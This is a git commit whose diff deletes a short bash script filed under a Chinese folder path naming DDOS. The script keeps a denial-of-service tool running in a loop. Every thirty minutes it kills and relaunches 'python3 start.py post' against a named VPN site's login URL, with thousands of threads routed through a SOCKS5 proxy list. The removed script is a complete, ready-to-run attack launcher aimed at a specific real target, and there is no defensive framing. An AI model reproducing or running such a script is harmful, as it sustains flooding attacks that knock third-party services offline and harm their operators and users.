eb131570cc3a4ad1904960bac6e2437ead77944a
TryAgainC <63404307+TryAgainC@users.noreply.github.com>
2025-04-11 00:04:34 +0800

    1

--- 科学上网/DDOS/服务器后台定时重启进程/reboot.sh
+++
@@ -1,9 +0,0 @@
-#!/bin/bash
-sleep_time=1800
-while :
-do
-  pid=`ps -aux |grep "python3 start.py post https://72vpn.xyz/#/login 1 30000 socks5.txt 10000 854854"|grep -v "grep" |awk '{print $2}'`
-  kill -9 $pid
-  nohup python3 start.py post https://72vpn.xyz/#/login 1 30000 socks5.txt 10000 854854 >> /dev/null 2>&1 &
-  sleep $sleep_time
-done
